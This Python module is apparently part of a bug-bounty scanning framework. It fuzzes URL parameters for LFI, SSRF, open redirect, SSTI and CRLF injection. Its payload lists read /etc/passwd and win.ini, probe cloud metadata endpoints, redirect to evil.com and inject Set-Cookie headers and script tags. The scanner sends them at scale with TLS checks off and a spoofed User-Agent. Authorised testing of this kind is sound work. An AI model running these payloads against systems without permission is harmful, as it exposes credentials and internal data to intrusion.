"""
Vulnerability Pattern Detection Module

Detects common vulnerabilities using pattern matching and fuzzing:
- LFI (Local File Inclusion)
- SSRF (Server-Side Request Forgery)
- Open Redirect
- SSTI (Server-Side Template Injection)
- Prototype Pollution
- CRLF Injection
- Path Traversal

Based on bug bounty one-liner techniques.

Output structure:
  vuln_patterns/
    ├── lfi_vulnerable.txt
    ├── ssrf_vulnerable.txt
    ├── redirect_vulnerable.txt
    ├── ssti_vulnerable.txt
    ├── all_vulnerable.txt
    └── vuln_patterns_summary.json
"""

import json
import re
import time
import urllib.request
import urllib.parse
import ssl
from pathlib import Path
from typing import List, Optional, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

from .base import ActiveModule, ModuleResult


class VulnPatternsModule(ActiveModule):
    """Detect common vulnerabilities using pattern-based testing."""

    name = "vuln_patterns"
    description = "Detect LFI, SSRF, Open Redirect, SSTI using pattern fuzzing"
    tools = []  # Pure Python implementation
    output_dir = "vuln_patterns"

    # LFI payloads and detection patterns
    LFI_PAYLOADS = [
        ("....//....//....//....//....//etc/passwd", "root:"),
        ("..%2f..%2f..%2f..%2f..%2fetc/passwd", "root:"),
        ("....\/....\/....\/....\/....\/etc/passwd", "root:"),
        ("/etc/passwd", "root:"),
        ("....//....//....//....//windows/win.ini", "[fonts]"),
        ("..%252f..%252f..%252f..%252fetc/passwd", "root:"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
        ("file:///etc/passwd", "root:"),
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/",  # GCP
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        "http://192.0.0.170/latest/meta-data/",  # Oracle
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.1",
        "http://0",
        "http://2130706433",  # 127.0.0.1 as decimal
    ]

    # Open Redirect payloads
    REDIRECT_PAYLOADS = [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2f..",
        "/\\evil.com",
        "////evil.com",
        "https:evil.com",
        r"\/\/evil.com",
        "//evil%E3%80%82com",
        "////evil.com/",
        "https://evil.com/..;/",
    ]

    # SSTI payloads and detection
    SSTI_PAYLOADS = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("${{7*7}}", "49"),
        ("{{config}}", "Config"),
        ("{{self}}", "TemplateReference"),
        ("*{7*7}", "49"),
    ]

    # CRLF payloads
    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0aSet-Cookie:crlf=injection",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
    ]

    # Parameters commonly vulnerable
    INTERESTING_PARAMS = [
        "url", "uri", "path", "dest", "redirect", "redirect_uri", "redirect_url",
        "return", "return_url", "next", "next_url", "rurl", "redir", "destination",
        "file", "document", "doc", "folder", "root", "pg", "page", "include",
        "dir", "show", "nav", "site", "load", "read", "fetch", "content",
        "template", "view", "layout", "theme", "preview", "callback", "target",
    ]

    def run(
        self,
        targets: List[str],
        resume: bool = True,
        input_file: Optional[Path] = None,
        **kwargs,
    ) -> ModuleResult:
        """
        Check targets for common vulnerabilities.

        Args:
            targets: List of URLs with parameters
            resume: Skip if output exists
            input_file: File containing URLs

        Returns:
            ModuleResult with vulnerability findings
        """
        start_time = time.time()
        self.ensure_output_dir()

        result = ModuleResult(
            module_name=self.name,
            success=True,
            duration=0.0,
        )

        # Load targets
        if input_file and input_file.exists():
            targets = self.read_input_file(input_file)

        if not targets:
            self.logger.warning("No targets for vulnerability pattern check")
            result.success = False
            result.duration = time.time() - start_time
            return result

        # Filter scope and get URLs with parameters
        targets = self.filter_scope(targets)
        targets = [t for t in targets if "=" in t]
        targets = list(set(targets))

        self.logger.info(f"{'='*50}")
        self.logger.info(f"Testing {len(targets)} URLs for vulnerabilities")
        self.logger.info(f"{'='*50}")

        # Output files
        all_vuln_file = self.output_path / "all_vulnerable.txt"

        if resume and all_vuln_file.exists() and all_vuln_file.stat().st_size > 0:
            self.logger.info("Resuming: Using existing vuln pattern results")
            vulns = self.read_input_file(all_vuln_file)
            result.stats["total_vulnerable"] = len(vulns)
            result.duration = time.time() - start_time
            return result

        # Findings by type
        findings = {
            "lfi": [],
            "ssrf": [],
            "redirect": [],
            "ssti": [],
            "crlf": [],
        }

        # Test each URL
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {
                executor.submit(self._test_url, url): url
                for url in targets[:1000]  # Limit to avoid overwhelming
            }

            for future in as_completed(futures):
                url = futures[future]
                try:
                    url_findings = future.result()
                    for vuln_type, vuln_url in url_findings:
                        findings[vuln_type].append(vuln_url)
                        result.findings.append({
                            "type": vuln_type,
                            "url": vuln_url,
                            "severity": "high" if vuln_type in ["lfi", "ssrf", "ssti"] else "medium",
                        })
                except Exception as e:
                    self.logger.debug(f"Error testing {url}: {e}")

        # Write results
        all_vulnerable = []
        for vuln_type, urls in findings.items():
            if urls:
                urls = list(set(urls))
                output_file = self.output_path / f"{vuln_type}_vulnerable.txt"
                self.write_output_file(output_file, urls)
                result.output_files[vuln_type] = output_file
                result.stats[f"{vuln_type}_count"] = len(urls)
                all_vulnerable.extend(urls)
                self.logger.info(f"  {vuln_type.upper()}: {len(urls)} vulnerable URLs")

        if all_vulnerable:
            all_vulnerable = list(set(all_vulnerable))
            self.write_output_file(all_vuln_file, all_vulnerable)
            result.output_files["all_vulnerable"] = all_vuln_file
            result.stats["total_vulnerable"] = len(all_vulnerable)

        # Save summary
        self._save_json_summary(result)

        result.duration = time.time() - start_time
        return result

    def _test_url(self, url: str) -> List[Tuple[str, str]]:
        """Test a URL for all vulnerability types."""
        findings = []

        # Parse URL
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # Check each parameter
        for param_name, param_values in params.items():
            param_lower = param_name.lower()

            # Test LFI on file-related params
            if any(p in param_lower for p in ["file", "path", "doc", "page", "include", "read", "load", "template", "view"]):
                if self._test_lfi(url, param_name):
                    findings.append(("lfi", url))

            # Test SSRF on URL-related params
            if any(p in param_lower for p in ["url", "uri", "dest", "fetch", "site", "callback", "target", "proxy"]):
                if self._test_ssrf(url, param_name):
                    findings.append(("ssrf", url))

            # Test Open Redirect
            if any(p in param_lower for p in ["redirect", "return", "next", "redir", "dest", "url", "goto", "out"]):
                if self._test_redirect(url, param_name):
                    findings.append(("redirect", url))

            # Test SSTI on template-related params
            if any(p in param_lower for p in ["template", "view", "name", "email", "user", "preview", "content"]):
                if self._test_ssti(url, param_name):
                    findings.append(("ssti", url))

        return findings

    def _make_request(self, url: str, timeout: int = 8) -> Tuple[str, Dict]:
        """Make HTTP request and return response."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
            }
        )

        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as response:
            body = response.read().decode('utf-8', errors='ignore')
            headers = dict(response.headers)
            return body, headers

    def _replace_param(self, url: str, param: str, value: str) -> str:
        """Replace parameter value in URL."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _test_lfi(self, url: str, param: str) -> bool:
        """Test for LFI vulnerability."""
        for payload, indicator in self.LFI_PAYLOADS:
            try:
                test_url = self._replace_param(url, param, payload)
                body, _ = self._make_request(test_url)
                if indicator.lower() in body.lower():
                    self.logger.info(f"  LFI: {url} [{param}]")
                    return True
            except Exception:
                continue
        return False

    def _test_ssrf(self, url: str, param: str) -> bool:
        """Test for SSRF vulnerability."""
        for payload in self.SSRF_PAYLOADS[:5]:  # Test fewer payloads
            try:
                test_url = self._replace_param(url, param, payload)
                body, _ = self._make_request(test_url, timeout=5)
                # Check for common SSRF indicators
                ssrf_indicators = [
                    "root:", "ami-id", "instance-id", "meta-data",
                    "computeMetadata", "OpenSSH", "Connection refused",
                    "404 Not Found", "Internal Server Error"
                ]
                if any(ind in body for ind in ssrf_indicators[:3]):
                    self.logger.info(f"  SSRF: {url} [{param}]")
                    return True
            except urllib.error.URLError as e:
                # Connection errors to internal IPs can indicate SSRF
                if "Connection refused" in str(e) or "timed out" in str(e):
                    continue
            except Exception:
                continue
        return False

    def _test_redirect(self, url: str, param: str) -> bool:
        """Test for Open Redirect."""
        for payload in self.REDIRECT_PAYLOADS[:5]:
            try:
                test_url = self._replace_param(url, param, payload)

                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                req = urllib.request.Request(
                    test_url,
                    headers={"User-Agent": "Mozilla/5.0"},
                )

                # Don't follow redirects
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx),
                    NoRedirectHandler()
                )

                response = opener.open(req, timeout=8)
                location = response.headers.get("Location", "")

                if "evil.com" in location:
                    self.logger.info(f"  Open Redirect: {url} [{param}]")
                    return True

            except urllib.error.HTTPError as e:
                location = e.headers.get("Location", "")
                if "evil.com" in location:
                    self.logger.info(f"  Open Redirect: {url} [{param}]")
                    return True
            except Exception:
                continue
        return False

    def _test_ssti(self, url: str, param: str) -> bool:
        """Test for SSTI vulnerability."""
        for payload, indicator in self.SSTI_PAYLOADS[:4]:
            try:
                test_url = self._replace_param(url, param, payload)
                body, _ = self._make_request(test_url)
                if indicator in body:
                    self.logger.info(f"  SSTI: {url} [{param}]")
                    return True
            except Exception:
                continue
        return False

    def _save_json_summary(self, result: ModuleResult) -> None:
        """Save JSON summary."""
        summary = {
            "module": self.name,
            "stats": result.stats,
            "output_files": {k: str(v) for k, v in result.output_files.items()},
            "tests_performed": ["LFI", "SSRF", "Open Redirect", "SSTI"],
            "findings_count": len(result.findings),
        }

        json_file = self.output_path / "vuln_patterns_summary.json"
        with open(json_file, "w") as f:
            json.dump(summary, f, indent=2)

        result.output_files["json_summary"] = json_file


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Handler that doesn't follow redirects."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None
